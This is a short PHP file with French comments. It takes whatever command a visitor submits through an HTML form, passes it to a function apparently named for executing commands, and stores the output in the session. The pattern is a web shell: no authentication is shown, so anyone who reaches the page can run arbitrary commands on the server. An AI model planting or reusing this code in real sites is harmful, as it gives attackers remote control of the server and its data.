<?php

// Traitement du formulaire si une commande est soumise
if ($_SERVER["REQUEST_METHOD"] == "POST" && $_POST["action"] == "TEST") {
    $_SESSION["last_command"] = ["cmd" => $_POST["command"], "output" => executeCommand($_POST["command"])];
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>

<!-- Formulaire d'exécution des commandes -->
<form method="post">
    <input type="hidden" name="action" value="TEST">
    <input type="text" name="command" placeholder="Entrer une commande..." required>
    <button type="submit">Exécuter</button>
</form>